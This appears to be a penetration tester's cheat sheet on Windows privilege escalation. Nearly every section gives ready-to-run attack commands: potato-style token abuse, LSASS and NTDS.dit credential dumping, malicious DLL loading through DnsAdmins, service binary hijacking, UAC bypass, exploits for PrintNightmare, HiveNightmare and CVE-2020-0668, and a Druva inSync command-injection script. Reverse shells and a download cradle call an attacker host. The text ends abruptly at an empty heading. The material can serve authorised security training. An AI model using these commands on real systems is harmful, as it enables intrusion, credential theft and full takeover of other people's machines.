# Windows Privilege Escalation

## Introduction to Windows Privilege Escalation

Goal is to escalate access to a member of Local Administrators or the NT AUTHORITY\SYSTEM (LocalSystem) account. Escalating to another user can also be enough.

### Practical Examples

#### Connecting via FreeRDP

```bash
xfreerdp /v:<TARGET_IP> /u:<USERNAME>
```

## Useful Tools

Binaries and scripts for enumerating privilege escalation vectors.

`Seatbelt` C# local privesc checks | `winPEAS` script for privesc paths | `PowerUp` PowerShell misconfig finder, can exploit some issues | `SharpUp` C# port of PowerUp

`JAWS` PowerShell privesc enum, PS 2.0 | `SessionGopher` finds/decrypts saved sessions (PuTTY, WinSCP, SuperPuTTY, FileZilla, RDP) | `Watson` enumerates missing KBs, suggests exploits

`LaZagne` retrieves stored passwords (browsers, chat tools, DB, Git, email, memory dumps, PHP, sysadmin tools, wifi, Windows credential storage) | `WES-NG` suggests exploits from systeminfo output, Windows XP-10/Server

Sysinternals Suite: `AccessChk`, `PipeList`, `PsService`

Upload tools to C:\Windows\Temp, BUILTIN\Users has write access there.

Compile tools from source before using in a client environment.

## Situational Awareness

Orient to the current host and network before escalating, find other reachable hosts, protections in place, and tools that may not work.

### Network Information

Dual-homed hosts may allow lateral movement into another network segment.

#### Interface(s), IP Address(es), DNS Information

```cmd
ipconfig /all
```

#### ARP Table

Shows hosts recently contacted, can hint at where admins RDP/WinRM from.

```cmd
arp -a
```

#### Routing Table

Reveals additional connected networks on dual-homed hosts.

```cmd
route print
```

### Enumerating Protections

AV/EDR and application whitelisting (AppLocker) may block tools or techniques. Enumerate before running tools to avoid detection.

#### Check Windows Defender Status

```powershell
Get-MpComputerStatus
```

#### List AppLocker Rules

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

#### Test AppLocker Policy

Simulates whether a path would be blocked for a given user.

```powershell
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

## Initial Enumeration

After gaining a low-priv shell, enumerate OS, version, services, users, and privileges to find a path to SYSTEM, local admin, or a privileged domain user.

### System Information

#### Tasklist

Look for non-standard processes/services running as SYSTEM or admin, good privesc targets.

```cmd
tasklist /svc
```

#### Display All Environment Variables

A writable folder listed before System32 in PATH enables DLL hijacking. HOMEDRIVE often maps to a network share, check for a writable Startup folder for roaming profile persistence.

```cmd
set
```

#### View Detailed Configuration Information

Check Hotfixes and boot time for patch level, a host not rebooted in 6+ months is often unpatched.

```cmd
systeminfo
```

#### Patches and Updates

```cmd
wmic qfe
```

```powershell
Get-HotFix | ft -AutoSize
```

#### Installed Programs

```cmd
wmic product get name
```

```powershell
Get-WmiObject -Class Win32_Product | select Name, Version
```

#### Display Running Processes

```cmd
netstat -ano
```

### User & Group Information

#### Logged-In Users

```cmd
query user
```

#### Current User

Check user context immediately, may already be SYSTEM or hold SeImpersonatePrivilege if running as a service account (abusable via Juicy Potato).

#### Current User Privileges

```cmd
whoami /priv
```

#### Current User Group Information

```cmd
whoami /groups
```

#### Get All Users

Check for naming patterns (e.g. a bob_adm admin account for user bob) for credential reuse, and browse other users' profile folders for passwords or SSH keys.

```cmd
net user
```

#### Get All Groups

```cmd
net localgroup
```

#### Details About a Group

```cmd
net localgroup administrators
```

#### Get Password Policy & Other Account Information

```cmd
net accounts
```

## Communication with Processes

Processes not running as admin may still offer a path to SYSTEM, e.g. a web/app shell running as a service account with SeImpersonate, exploitable via Potato tools.

### Access Tokens

Describe the security context of a process or thread (user identity plus privileges). Assigned at logon, a copy is presented each time the user interacts with a process.

### Enumerating Network Services

The most common way to interact with processes is over a network socket (DNS, HTTP, SMB, etc).

#### Display Active Network Connections

Check for ports listening only on loopback (127.0.0.1, ::1) rather than the host IP or 0.0.0.0/broadcast, these are often left unauthenticated. Example: FileZilla's admin interface on port 14147 can leak FTP passwords or create an FTP share as the FileZilla Server user.

#### More Examples

Splunk Universal Forwarder (ships logs from endpoints) ran unauthenticated by default and let anyone deploy applications for code execution as SYSTEM. Tool: SplunkWhisperer2.

Erlang nodes join a cluster using a shared secret cookie, exposed on port 25672. RabbitMQ's default cookie is `rabbit`. Other Erlang-based apps: SolarWinds, CouchDB.

### Named Pipes

Pipes are files stored in memory, cleared after being read. Cobalt Strike uses named pipes (e.g. `\.\pipe\msagent_12`) for command output, sometimes renamed (e.g. to `mojo`) to masquerade as another program.

#### Listing Named Pipes with Pipelist

```cmd
pipelist.exe /accepteula
```

#### Listing Named Pipes with PowerShell

```powershell
gci \\.\pipe\
```

#### Reviewing LSASS Named Pipe Permissions

```cmd
accesschk.exe /accepteula \\.\Pipe\lsass -v
accesschk.exe /accepteula \pipe\* -v
```

By default only BUILTIN\Administrators has full access to the lsass pipe.

#### Named Pipes Attack Example

Search for named pipes granting write access to Everyone, abusable for privesc (e.g. WindscribeService Named Pipe Privilege Escalation).

```cmd
accesschk.exe -w \pipe\* -v
accesschk.exe -accepteula -w \pipe\WindscribeService -v
```

## Windows Privileges Overview

Rights to perform system operations like managing services, loading drivers, or debugging. Granted via access token at logon, most disabled by default.

### Windows Authorization Process

Every security principal (user, computer, process, group) gets a unique SID. Access is decided by comparing the access token (SIDs, privileges) against the target object's ACEs in its security descriptor (DACL).

### Rights and Privileges in Windows

`Default Administrators` Domain/Enterprise Admins, super groups | `Server Operators` modify services, access SMB shares, backup files | `Backup Operators` log on to DCs locally, shadow copy SAM/NTDS, read registry remotely, access DC filesystem via SMB, treat as Domain Admins | `Print Operators` log on to DCs locally, can load a malicious driver | `Hyper-V Administrators` admins of virtual DCs, treat as Domain Admins

`Account Operators` modify non-protected accounts/groups in the domain | `Remote Desktop Users` no perms by default, often granted RDP login for lateral movement | `Remote Management Users` PSRemoting to DCs | `Group Policy Creator Owners` create GPOs, need delegation to link them | `Schema Admins` modify AD schema, backdoor ACLs on new objects | `DNS Admins` load a DLL on a DC (crashes the service), more reliable via a WPAD record

### User Rights Assignment

`SeNetworkLogonRight` access this computer from the network (SMB/NetBIOS/CIFS/COM+) | `SeRemoteInteractiveLogonRight` allow logon via RDP | `SeBackupPrivilege` bypass file/registry permissions for backup | `SeSecurityPrivilege` manage audit/security log, view/clear Security log | `SeTakeOwnershipPrivilege` take ownership of any securable object | `SeDebugPrivilege` attach/open any process, access sensitive OS components | `SeImpersonatePrivilege` impersonate a client after authentication | `SeLoadDriverPrivilege` load/unload device drivers | `SeRestorePrivilege` bypass permissions restoring files, set a security principal as owner | `SeTcbPrivilege` act as part of the OS, assume identity of any user

Backup Operators are granted SeShutdownPrivilege, letting them shut down a DC if logged on locally.

### Detection

Event ID 4672 (Special privileges assigned to new logon) logs when sensitive privileges are granted to a new logon session.

## SeImpersonate and SeAssignPrimaryToken

SeImpersonatePrivilege lets a process use another account's token, normally admin-only. Potato-style attacks trick a SYSTEM process into handing its token to a lower-privileged process holding this right.

### SeImpersonate Example - JuicyPotato

Check for this privilege right after RCE as a service account (web shell, Jenkins, MSSQL xp_cmdshell).

#### Connecting with MSSQLClient.py

```bash
mssqlclient.py <USERNAME>@<TARGET_IP> -windows-auth
```

#### Enabling xp_cmdshell

```sql
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
SQL> xp_cmdshell whoami /priv
```

#### Escalating Privileges Using JuicyPotato

JuicyPotato abuses SeImpersonate/SeAssignPrimaryToken via DCOM/NTLM reflection. Does not work on Windows Server 2019 or Windows 10 1809+.

```sql
SQL> xp_cmdshell JuicyPotato.exe -l <PORT> -p c:\windows\system32\cmd.exe -a "/c nc.exe <ATTACKER_IP> <PORT_2> -e cmd.exe" -t *
```

`-l` COM server listening port | `-p` program to launch | `-a` arguments passed to -p | `-t` CreateProcess call to try (`*` tries both CreateProcessWithTokenW and CreateProcessAsUser, needing SeImpersonate and SeAssignPrimaryToken respectively)

```bash
sudo nc -lnvp <PORT_2>
```

### PrintSpoofer and RoguePotato

Use on Windows 10 / Server 2019+ where JuicyPotato no longer works.

#### Escalating Privileges using PrintSpoofer

```sql
SQL> xp_cmdshell PrintSpoofer.exe -c "nc.exe <ATTACKER_IP> <PORT> -e cmd"
```

`-c` command to execute after impersonating SYSTEM

```bash
nc -lnvp <PORT>
```

## SeDebugPrivilege

Lets a user attach to or open any process, including memory access. Admin-only by default, sometimes granted via GPO to developers for debugging.

### Dumping LSASS with ProcDump and Mimikatz

Developers with SeDebugPrivilege may not be local admin and won't show in BloodHound, worth targeting when cracking NTLMv2 hashes from Responder/Inveigh.

```cmd
procdump.exe -accepteula -ma lsass.exe <OUTPUT_FILE>
```

`-ma` full memory dump

```text
mimikatz # log
mimikatz # sekurlsa::minidump <OUTPUT_FILE>
mimikatz # sekurlsa::logonpasswords
```

Run `log` first to write Mimikatz output to a file.

Without tool access but with RDP, dump LSASS manually via Task Manager: Details tab, select lsass.exe, Create dump file.

### Remote Code Execution as SYSTEM

Use SeDebugPrivilege to inherit a SYSTEM parent process's token and spawn a process as SYSTEM. Needs an elevated console. Target a known SYSTEM PID (e.g. winlogon.exe, lsass.exe) via tasklist or Get-Process.

PoC: https://github.com/decoder-it/psgetsystem

```powershell
[MyProcess]::CreateProcessFromParent(<PID>,<COMMAND>,"")
```

Trailing empty string argument is required.

## SeTakeOwnershipPrivilege

Grants WRITE_OWNER over any securable object (files, registry keys, services, processes), letting the holder take ownership. Admin-default, sometimes seen with SeBackupPrivilege or SeRestorePrivilege on service accounts.

### Leveraging the Privilege

Set in Group Policy under Computer Configuration / Windows Settings / Security Settings / Local Policies / User Rights Assignment.

#### Enabling SeTakeOwnershipPrivilege

```powershell
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
```

#### Choosing a Target File

```powershell
Get-ChildItem -Path <TARGET_FILE> | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
cmd /c dir /q <TARGET_FILE>
```

`/q` shows file/folder owner

#### Taking Ownership of the File

```powershell
takeown /f <TARGET_FILE>
```

#### Modifying the File ACL

Taking ownership does not grant read access by itself, grant permissions with icacls first.

```powershell
icacls <TARGET_FILE> /grant <USERNAME>:F
```

`:F` full control

### When to Use?

#### Files of Interest

```text
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

Also check for .kdbx KeePass databases, OneNote notebooks, and files like passwords._, pass._, creds.*, scripts, other config files, and virtual hard drive files.
## Windows Built-in Groups

Groups shipped with Windows or added with AD Domain Services. Membership in some can be leveraged to escalate privileges on a server or Domain Controller.

### Backup Operators

Grants SeBackupPrivilege and SeRestorePrivilege, and allows local logon to a Domain Controller. SeBackupPrivilege lets you traverse and list any folder and copy files bypassing ACLs, using backup semantics (FILE_FLAG_BACKUP_SEMANTICS) instead of the normal copy command.

#### Enabling SeBackupPrivilege

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Get-SeBackupPrivilege # check status
Set-SeBackupPrivilege # enable
```

May need an elevated prompt (UAC bypass) to use the privilege depending on server settings.

#### Copying a Protected File

```powershell
Copy-FileSeBackupPrivilege <TARGET_FILE> <OUTPUT_FILE>
```

An explicit deny ACE on the file does not block this as long as SeBackupPrivilege is enabled and backup semantics are used.

#### Attacking a Domain Controller - Copying NTDS.dit

NTDS.dit is locked by default. Use diskshadow to shadow copy the C drive and expose it as another drive letter, bypassing the lock.

```text
DISKSHADOW> set verbose on
DISKSHADOW> set metadata <OUTPUT_FILE>.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```

```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit <OUTPUT_FILE>
```

#### Backing up SAM and SYSTEM Registry Hives

```cmd
reg save HKLM\SYSTEM <OUTPUT_FILE>
reg save HKLM\SAM <OUTPUT_FILE_2>
```

#### Extracting Credentials from NTDS.dit

```powershell
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName <DISTINGUISHED_NAME> -DBPath .\ntds.dit -BootKey $key
```

```bash
secretsdump.py -ntds ntds.dit -system <OUTPUT_FILE> -hashes lmhash:nthash LOCAL
```

Hashes can be used for pass-the-hash or cracked offline with Hashcat.

#### Copying Files with Robocopy

Copies in backup mode without extra tools. Differs from copy by comparing files and removing stale ones in the destination.

```cmd
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

`/B` backup mode

## Event Log Readers

Members can access the Security event log, which may record process command lines (event 4688) containing credentials if command-line auditing is enabled.

#### Confirming Group Membership

```cmd
net localgroup "Event Log Readers"
```

#### Searching Security Logs Using wevtutil

```powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

```cmd
wevtutil qe Security /rd:true /f:text /r:<COMPUTER> /u:<USERNAME> /p:<PASSWORD> | findstr "/user"
```

#### Searching Security Logs Using Get-WinEvent

Requires administrator access, or adjusted permissions on HKLM\System\CurrentControlSet\Services\Eventlog\Security. Event Log Readers membership alone is not enough for this cmdlet.

```powershell
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

Supports `-Credential` to run as another user.

The PowerShell Operational log may also hold credentials if script block or module logging is enabled, and is readable by unprivileged users.

## DnsAdmins

DNS service runs as NT AUTHORITY\SYSTEM. Members can set a path to a custom plugin DLL with no path verification, loaded on DNS service restart, giving code execution as SYSTEM on a DC.

#### Generating and Loading a Malicious DLL

```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" <USERNAME> /add /domain' -f dll -o <FILE>
python3 -m http.server <PORT>
```

```powershell
wget "<URL>" -outfile "<FILE>"
```

```cmd
dnscmd.exe /config /serverlevelplugindll <FILE>
```

Fails with access denied for a non-DnsAdmins user. Full path to the DLL is required or the attack fails. Only dnscmd can be used, DnsAdmins has no direct registry permission.

#### Checking Permissions on DNS Service

```cmd
wmic useraccount where name="<USERNAME>" get sid
sc.exe sdshow DNS
```

RPWP maps to SERVICE_START and SERVICE_STOP.

#### Restarting the DNS Service

Needed to trigger the DLL load. DnsAdmins membership alone doesn't grant restart rights, this may require separate access.

```cmd
sc stop dns
sc start dns
```

```cmd
net group "Domain Admins" /dom
```

#### Using Mimilib.dll

Alternative DLL from the Mimikatz author, edit the `system()` call in its `kdns.c` to run a chosen command, then load it the same way as a custom plugin DLL.

#### Cleaning Up

```cmd
reg query \\<TARGET_IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
reg delete \\<TARGET_IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
sc.exe start dns
sc query dns
```

#### Creating a WPAD Record

Membership disables the global query block list (blocks WPAD/ISATAP hijacking by default). Any domain user can then create a WPAD record and proxy traffic from hosts running WPAD defaults, for capture with Responder/Inveigh or an SMB relay.

```powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName <DC_HOSTNAME>
Add-DnsServerResourceRecordA -Name wpad -ZoneName <TARGET_DOMAIN> -ComputerName <DC_HOSTNAME> -IPv4Address <ATTACKER_IP>
```

## Hyper-V Administrators

Full access to all Hyper-V features. Admins of virtualized Domain Controllers should be treated as Domain Admins, they could clone the live DC and mount its disk offline to extract NTDS.dit.

On VM deletion, vmms.exe restores the .vhdx file's permissions as SYSTEM without impersonating the user. Deleting the .vhdx and creating a hard link to a protected SYSTEM file grants full permissions on that file.

Directly exploitable if vulnerable to CVE-2018-0952 or CVE-2019-0841. Otherwise target an app-installed service running as SYSTEM that unprivileged users can start, e.g. the Mozilla Maintenance Service.

PoC: https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1

#### Taking Ownership of the Target File

Run the hard-link PoC first to gain full permissions on the file.

```cmd
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```

#### Starting the Service

Replace the binary with a malicious one first.

```cmd
sc.exe start MozillaMaintenance
```

Mitigated by the March 2020 Windows update, which changed hard link behavior.

## Print Operators

Grants SeLoadDriverPrivilege, rights to manage printers on a Domain Controller, and local logon to a DC.

If SeLoadDriverPrivilege isn't listed from an unelevated `whoami /priv`, bypass UAC first (see the UACMe repo). Capcom.sys is a driver with a known flaw letting any user execute shellcode with SYSTEM privileges once loaded.

#### Enabling the Privilege and Referencing the Driver

Compile the enabler with Visual Studio (`cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp`).

```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\<FILE>"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

`\??\` is an NT object path, required for the Win32 API to resolve the driver's ImagePath.

```powershell
DriverView.exe /stext <OUTPUT_FILE> # verify driver loaded, before/after
```

```cmd
EnableSeLoadDriverPrivilege.exe
```

#### Exploiting the Driver

```powershell
ExploitCapcom.exe
```

Steals a token and launches a SYSTEM shell. Without GUI access, edit ExploitCapcom.cpp's LaunchShell function to replace `C:\\Windows\\system32\\cmd.exe` with a custom binary (e.g. an msfvenom reverse shell) before compiling.

#### Automating with EopLoadDriver

```cmd
EoPLoadDriver.exe System\CurrentControlSet\Capcom <FILE>
```

Then run ExploitCapcom.exe as before.

#### Clean-up

```cmd
reg delete HKCU\System\CurrentControlSet\Capcom
```

Since Windows 10 1803, this is not exploitable, references to HKEY_CURRENT_USER keys no longer work for this technique.

## Server Operators

Lets members administer Windows servers, including DCs, without Domain Admin rights. Grants SeBackupPrivilege, SeRestorePrivilege, and control over local services.

#### Checking Service Permissions

```cmd
sc qc <SERVICE>
```

```cmd
PsService.exe security <SERVICE>
```

Confirms SERVICE_ALL_ACCESS for Server Operators on SYSTEM-run services.

#### Modifying the Service Binary Path

```cmd
sc config <SERVICE> binPath= "cmd /c net localgroup Administrators <USERNAME> /add"
sc start <SERVICE>
```

Start fails, but the binpath command still runs.

#### Confirming Access on the Domain Controller

```bash
crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD>
secretsdump.py <USERNAME>@<TARGET_IP> -just-dc-user <USERNAME_2>
```

## User Account Control

Prompts for consent on elevated actions. Restricts apps to a standard-user token unless an administrator explicitly authorizes elevation. Convenience feature, not a security boundary.

### UAC Group Policy Settings

`FilterAdministratorToken` Admin Approval Mode for built-in Administrator, default disabled | `EnableUIADesktopToggle` UIAccess elevation without secure desktop, default disabled | `ConsentPromptBehaviorAdmin` elevation prompt for admins, default prompt for consent | `ConsentPromptBehaviorUser` elevation for standard users, default prompt for creds on secure desktop | `EnableInstallerDetection` detect installers and prompt, default enabled home/disabled enterprise | `ValidateAdminCodeSignatures` only elevate signed executables, default disabled | `EnableSecureUIAPaths` only elevate UIAccess apps from secure locations, default enabled | `EnableLUA` run admins in Admin Approval Mode, default enabled | `PromptOnSecureDesktop` use secure desktop when prompting, default enabled | `EnableVirtualization` virtualize file/registry write failures per-user, default enabled

### Checking UAC Configuration

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

`ConsentPromptBehaviorAdmin` of 0x5 is the highest UAC level (Always notify), fewer bypasses work here.

```powershell
[environment]::OSVersion.Version
```

Cross-reference the build number to the Windows release, then check the UACMe repo for a bypass technique matching that build.

### UAC Bypass via DLL Hijacking (SystemPropertiesAdvanced.exe)

The 32-bit SystemPropertiesAdvanced.exe auto-elevates and tries to load a non-existent srrstr.dll, searched for in the user-writable WindowsApps folder on PATH among other locations.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll > srrstr.dll
python3 -m http.server <PORT_2>
```

```powershell
curl http://<ATTACKER_IP>:<PORT_2>/srrstr.dll -O "<FILE>"
```

```bash
nc -lvnp <PORT>
```

```cmd
rundll32 shell32.dll,Control_RunDLL <FILE>
```

Confirms the DLL runs with normal (non-elevated) rights.

```cmd
taskkill /PID <PID> /F
```

Kill leftover rundll32.exe processes from testing before running the real auto-elevating binary, or the technique may not trigger cleanly.

```cmd
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

Catching the resulting shell shows the same user but with the full elevated privilege set listed (enabled where applicable).

## Weak Permissions

Services usually run as SYSTEM, so a permissions flaw in a service binary, its ACL, or its registry key often leads to full system control.

### Permissive File System ACLs

```powershell
SharpUp.exe audit
```

Flags modifiable service binaries.

```powershell
icacls "<FILE>"
```

Confirms Everyone/BUILTIN\Users have full control.

```cmd
copy /Y <FILE> "<TARGET_FILE>"
sc start <SERVICE>
```

Replace the binary with a malicious one (e.g. an msfvenom payload) if the service is also user-startable.

### Weak Service Permissions

```cmd
accesschk.exe /accepteula -quvcw <SERVICE>
```

`-q` omit banner | `-u` suppress errors | `-v` verbose | `-c` service name | `-w` write access only

```cmd
sc config <SERVICE> binpath="cmd /c net localgroup administrators <USERNAME> /add"
sc stop <SERVICE>
sc start <SERVICE>
```

Start fails but the binpath command runs first. CVE-2019-1322 allowed this same technique against the Windows Update Orchestrator Service (UsoSvc) before being patched.

#### Cleanup

```cmd
sc config <SERVICE> binPath="\"<TARGET_FILE>\""
sc qc <SERVICE>
sc start <SERVICE>
sc query <SERVICE>
```

### Unquoted Service Path

An unquoted service binary path with spaces lets Windows try each earlier path segment as an executable (`.exe` implied) before reaching the real binary.

```cmd
sc qc <SERVICE>
```

```cmd
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

Exploiting this needs write access to the root or Program Files folder (needs admin) and a service restart, rarely usable in practice.

### Permissive Registry ACLs

```cmd
accesschk.exe /accepteula "<USERNAME>" -kvuqsw hklm\System\CurrentControlSet\services
```

```powershell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\<SERVICE> -Name "ImagePath" -Value "<FILE> -e cmd.exe <ATTACKER_IP> <PORT>"
```

### Modifiable Registry Autorun Binary

```powershell
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```

Write access to an autorun value or its target binary gives code execution as the next user who logs in.

## Kernel Exploits

Known OS-level RCE/LPE vulnerabilities from missed patches. Can cause instability or a crash, be careful running against production systems.

MS08-067 and MS17-010 (EternalBlue): SMB RCE flaws, usable as local privesc if port 445 is only reachable locally, by port-forwarding 445 back to the attack box or running the exploit locally.

ALPC Task Scheduler 0-Day: writes arbitrary DACLs to .job files in C:\Windows\tasks via a hard link, hijacks a DLL as SYSTEM through the Spooler service using an XPS print job.

### CVE-2021-36934 (HiveNightmare / SeriousSam)

Any user can read the SAM, SYSTEM, and SECURITY registry hives regardless of privilege. Requires an existing shadow copy (Windows 10 System Protection usually creates these by default).

```cmd
icacls c:\Windows\System32\config\SAM
```

Vulnerable if BUILTIN\Users has read access.

```powershell
HiveNightmare.exe
```

```bash
impacket-secretsdump -sam <FILE> -system <FILE_2> -security <FILE_3> local
```

### CVE-2021-1675 / CVE-2021-34527 (PrintNightmare)

RpcAddPrinterDriver flaw lets any authenticated user add a print driver without SeLoadDriverPrivilege, giving SYSTEM RCE on any host with the Spooler service running (common on DCs, Win7/10, and servers).

```powershell
ls \\localhost\pipe\spoolss
```

Errors with "path does not exist" if the Spooler service is not running.

```powershell
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "<USERNAME>" -NewPassword "<PASSWORD>" -DriverName "<DRIVER_NAME>"
```

Adds a local admin by default, or supply a custom DLL for a reverse shell instead if adding a user is out of scope.

### Enumerating Missing Patches

```powershell
systeminfo
wmic qfe list brief
Get-Hotfix
```

Look up each KB in the Microsoft Update Catalog to gauge how far behind on patches the host is.

### CVE-2020-0668

Abuses Windows Service Tracing. Setting a small MaxFileSize renames a tracked file to .OLD when triggered, a move performed by SYSTEM, abusable via mount points and symbolic links to move an arbitrary file.

Only writes a new file into a protected folder (e.g. C:\Windows\System32), can't overwrite existing files. Must chain with something like UsoDllLoader or DiagHub for code execution, or target a user-startable SYSTEM service with a user-writable binary (e.g. Mozilla Maintenance Service).

```cmd
icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe > maintenanceservice.exe
python3 -m http.server <PORT_2>
```

```powershell
wget http://<ATTACKER_IP>:<PORT_2>/maintenanceservice.exe -O <FILE>
wget http://<ATTACKER_IP>:<PORT_2>/maintenanceservice.exe -O <FILE_2>
```

Download two copies, the exploit corrupts the one it moves.

```cmd
CVE-2020-0668.exe <FILE> "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

```cmd
icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

Confirms full control of the target binary after the move.

```cmd
copy /Y <FILE_2> "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

Run from cmd.exe, not PowerShell. Rename the second copy to the exact target filename or the service won't start.

```text
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <ATTACKER_IP>
set LPORT <PORT>
exploit
```

```bash
sudo msfconsole -r handler.rc
```

```cmd
net start MozillaMaintenance
```

Start errors out, but the payload still executes and a callback follows.

## Vulnerable Services

Third-party or custom services with known or discoverable vulnerabilities, can provide a path to SYSTEM even on a well-patched, well-configured host.

```cmd
wmic product get name
```

Check any non-standard software against public vulnerabilities, e.g. Druva inSync 6.6.3 had a command injection flaw via an exposed RPC service on port 6064, running as NT AUTHORITY\SYSTEM.

```cmd
netstat -ano | findstr 6064
```

```powershell
get-process -Id <PID>
get-service | ? {$_.DisplayName -like '<SERVICE>*'}
```

### Druva inSync RPC Command Injection

```powershell
$cmd = "net user <USERNAME> /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

Modify `$cmd` to chain a reverse shell instead of adding a user, e.g. using Invoke-PowerShellTcp.ps1:
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

```powershell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://<ATTACKER_IP>:<PORT>/shell.ps1')"
```

```bash
python3 -m http.server <PORT>
```

```bash
nc -lvnp <PORT_2>
```

## DLL Injection

Inserts code as a DLL into a running process to execute within its context. Used legitimately (hot patching) and maliciously to evade detection.

### LoadLibrary

Loads a DLL into a target process via the LoadLibrary API, by allocating memory for the DLL path in the target and starting a remote thread at LoadLibrary pointing to it.

```c
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, <PID>);
LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);
LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, 0, NULL);
```

### Manual Mapping

Manually loads a DLL into a process's memory and resolves its imports and relocations, avoiding LoadLibrary (which security and anti-cheat tools monitor).

Steps: load the DLL as raw data, map its sections into the target process, inject shellcode to relocate it, fix imports, run TLS callbacks, call DllMain.

### Reflective DLL Injection

The library loads itself into a host process via its own exported ReflectiveLoader function, resolving its own imports and relocations without the host needing to call LoadLibrary.

### DLL Hijacking

Exploits the Windows DLL search order when an application doesn't specify a DLL's full path.

#### Safe DLL Search Mode

Enabled by default, moves the current directory lower in the search order. Toggled via the registry.

```text
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager
```

`SafeDllSearchMode` REG_DWORD, `1` enable | `0` disable, reboot required for change to take effect

Enabled order: app dir, system dir, 16-bit system dir, Windows dir, current dir, PATH.  
Disabled order: app dir, current dir, system dir, 16-bit system dir, Windows dir, PATH.

Tools to find which DLL a target is loading: Process Explorer, PE Explorer, procmon (filter Operation is Load Image, or NAME NOT FOUND for missing DLLs).

#### Proxying

Create a replacement DLL that loads the real one (renamed), calls its function, tampers with the result, and returns it, so the host app keeps working while running attacker code.

```c
typedef int (*AddFunc)(int, int);

int Add(int a, int b)
{
    HMODULE originalLibrary = LoadLibraryA("library.o.dll");
    AddFunc originalAdd = (AddFunc)GetProcAddress(originalLibrary, "Add");
    int result = originalAdd(a, b);
    result += 1;
    return result;
}
```

Rename the legitimate DLL to `library.o.dll`, rename the proxy DLL to the original's name.

#### Invalid Libraries

